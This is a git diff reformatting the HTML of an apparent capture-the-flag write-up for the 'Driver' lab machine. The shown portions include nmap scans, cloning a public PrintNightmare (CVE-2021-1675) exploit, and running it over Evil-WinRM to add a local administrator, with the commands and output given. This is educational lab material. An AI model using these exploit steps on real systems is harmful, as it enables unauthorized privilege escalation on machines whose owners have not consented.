@@ -243,20 +243,20 @@ into the {body} of the default.hbs template -->
 
 <p>I deployed the machine and was given the target IP 10.10.11.106. I started a NMAP scan to check the available ports.</p>
 
-<figure class="highlight"><pre><code class="language-shell" data-lang="shell">└──╼ <span class="nv">$sudo</span> nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap/initial 10.10.11.106
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-02-27 17:20 GMT
-Nmap scan report <span class="k">for </span>10.10.11.106
-Host is up <span class="o">(</span>0.020s latency<span class="o">)</span><span class="nb">.</span>
+<pre><code class="language-highlight">└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.11.106
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:20 GMT
+Nmap scan report for 10.10.11.106
+Host is up (0.020s latency).
 Not shown: 997 filtered ports
 PORT    STATE SERVICE      VERSION
 80/tcp  open  http         Microsoft IIS httpd 10.0
 | http-auth: 
-| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D
-|_  Basic <span class="nv">realm</span><span class="o">=</span>MFP Firmware Update Center. Please enter password <span class="k">for </span>admin
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
 | http-methods: 
 |_  Potentially risky methods: TRACE
 |_http-server-header: Microsoft-IIS/10.0
-|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
 135/tcp open  msrpc        Microsoft Windows RPC
 445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
 Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
@@ -276,7 +276,8 @@ Host script results:
 |_  start_date: 2022-02-27T04:55:51
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 51.89 seconds</span></code></pre></figure>
+Nmap done: 1 IP address (1 host up) scanned in 51.89 seconds
+</code></pre>
 
 <p>3 Ports open:</p>
 
@@ -288,16 +289,17 @@ Nmap done: 1 IP address (1 host up) scanned in 51.89 seconds</span></code></pre>
 
 <p>I also ran a full port scan and found winrm to be open on port 5985.</p>
 
-<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell">└──╼ <span class="nv">$sudo</span> nmap -p- -oA nmap/all_ports 10.10.11.106
-Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-02-27 17:25 GMT
-Nmap scan report <span class="k">for </span>10.10.11.106
-Host is up <span class="o">(</span>0.026s latency<span class="o">)</span><span class="nb">.</span>
+<pre><code class="language-highlight">└──╼ $sudo nmap -p- -oA nmap/all_ports 10.10.11.106
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:25 GMT
+Nmap scan report for 10.10.11.106
+Host is up (0.026s latency).
 Not shown: 65531 filtered ports
 PORT     STATE SERVICE
 80/tcp   open  http
 135/tcp  open  msrpc
 445/tcp  open  microsoft-ds
-5985/tcp open  wsman</code></pre></figure>
+5985/tcp open  wsman
+</code></pre>
 
 <p>The web service is showing an unauthorized response however it could be leaking a username with the message “Please enter password for admin”.</p>
 
@@ -388,38 +390,40 @@ Protocol: [MS-RPRN]: Print System Remote Protocol
 
 <p>I used git to clone the repo in to my /opt directory.</p>
 
-<figure class="highlight"><pre><code class="language-shell" data-lang="shell">└──╼ <span class="nv">$sudo</span> git clone https://github.com/calebstewart/CVE-2021-1675.git
-Cloning into <span class="s1">'CVE-2021-1675'</span>...
-remote: Enumerating objects: 40, <span class="k">done</span><span class="nb">.</span>
-remote: Counting objects: 100% <span class="o">(</span>40/40<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
-remote: Compressing objects: 100% <span class="o">(</span>32/32<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
-remote: Total 40 <span class="o">(</span>delta 9<span class="o">)</span>, reused 37 <span class="o">(</span>delta 6<span class="o">)</span>, pack-reused 0
-Receiving objects: 100% <span class="o">(</span>40/40<span class="o">)</span>, 131.12 KiB | 932.00 KiB/s, <span class="k">done</span><span class="nb">.</span>
-Resolving deltas: 100% <span class="o">(</span>9/9<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
+<pre><code class="language-highlight">└──╼ $sudo git clone https://github.com/calebstewart/CVE-2021-1675.git
+Cloning into 'CVE-2021-1675'...
+remote: Enumerating objects: 40, done.
+remote: Counting objects: 100% (40/40), done.
+remote: Compressing objects: 100% (32/32), done.
+remote: Total 40 (delta 9), reused 37 (delta 6), pack-reused 0
+Receiving objects: 100% (40/40), 131.12 KiB | 932.00 KiB/s, done.
+Resolving deltas: 100% (9/9), done.
 ┌─[daz@parrotos]─[/opt]
-└──╼ <span class="nv">$cd</span> CVE-2021-1675
+└──╼ $cd CVE-2021-1675
 ┌─[daz@parrotos]─[/opt/CVE-2021-1675]
-└──╼ <span class="nv">$ls</span>
-CVE-2021-1675.ps1  nightmare-dll  README.md</code></pre></figure>
+└──╼ $ls
+CVE-2021-1675.ps1  nightmare-dll  README.md
+</code></pre>
 
 <p>Now using Evil-WinRM I can upload the powershell script and execute it.</p>
 
-<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="k">*</span>Evil-WinRM<span class="k">*</span> <span class="nb">PS </span>C:\Users\tony\Documents&gt; upload /opt/CVE-2021-1675/CVE-2021-1675.ps1
+<pre><code class="language-highlight">*Evil-WinRM* PS C:\Users\tony\Documents&gt; upload /opt/CVE-2021-1675/CVE-2021-1675.ps1
 Info: Uploading /opt/CVE-2021-1675/CVE-2021-1675.ps1 to C:\Users\tony\Documents\CVE-2021-1675.ps1
 
                                                              
-<span class="k">Data</span>: 238080 bytes of 238080 bytes copied
+Data: 238080 bytes of 238080 bytes copied
 
 Info: Upload successful!
 
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> <span class="nb">PS </span>C:\Users\tony\Documents&gt; Import-Module C:\Users\tony\Documents\CVE-2021-1675.ps1
-<span class="k">*</span>Evil-WinRM<span class="k">*</span> <span class="nb">PS </span>C:\Users\tony\Documents&gt; Invoke-Nightmare
-<span class="o">[</span>+] <span class="k">using </span>default new user: adm1n
-<span class="o">[</span>+] <span class="k">using </span>default new password: P@ssw0rd
-<span class="o">[</span>+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
-<span class="o">[</span>+] <span class="k">using </span>pDriverPath <span class="o">=</span> <span class="s2">"C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"</span>
-<span class="o">[</span>+] added user  as <span class="nb">local </span>administrator
-<span class="o">[</span>+] deleting payload <span class="k">from </span>C:\Users\tony\AppData\Local\Temp\nightmare.dll</code></pre></figure>
+*Evil-WinRM* PS C:\Users\tony\Documents&gt; Import-Module C:\Users\tony\Documents\CVE-2021-1675.ps1
+*Evil-WinRM* PS C:\Users\tony\Documents&gt; Invoke-Nightmare
+[+] using default new user: adm1n
+[+] using default new password: P@ssw0rd
+[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll
+[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_f66d9eed7e835e97\Amd64\mxdwdrv.dll"
+[+] added user  as local administrator
+[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
+</code></pre>
 
 <p>It worked! I canceled my current WinRM session and logged back in using the new credentials.</p>
 
